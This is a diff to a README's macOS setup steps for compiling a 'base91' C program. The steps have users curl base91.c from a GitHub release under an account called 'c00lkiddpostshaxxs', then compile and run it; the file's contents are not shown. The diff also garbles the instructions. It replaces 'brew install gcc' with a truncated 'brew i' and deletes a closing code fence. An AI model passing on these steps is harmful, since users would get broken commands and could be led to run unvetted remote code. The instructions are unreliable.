@@ -39,8 +39,10 @@ Step 1: Check if gcc is installed:
 ```bash
 gcc --version
 ```
-*If it says **"Apple clang version..."**, you do not have the real GCC. You are using Apple's default Clang compiler. Install it with the command below:*   
-
+*If it says **"Apple clang version..."**, you do not have the real GCC. You are using Apple's default Clang compiler. Run the command below to compile it:*   
+```bash
+clang -O2 base91.c -o base91
+```
 *If it pops up a window asking you to install **"command line developer tools",** it means you have no compiler installed at all. Install it with the command below:*   
 Check if Homebrew is installed on your Mac:
 ```bash
@@ -54,8 +56,7 @@ Copy this command into your terminal to install Homebrew if not:
 It'll ask for your password. Type your password, it won't show then hit Enter.   
 Once done, type this command:
 ```bash
-brew install gcc
-```
+brew i
 Step 2: Install the C file:
 ```bash
 curl -fsSL 'https://github.com/c00lkiddpostshaxxs/base91/releases/download/v1/base91.c' -o base91.c
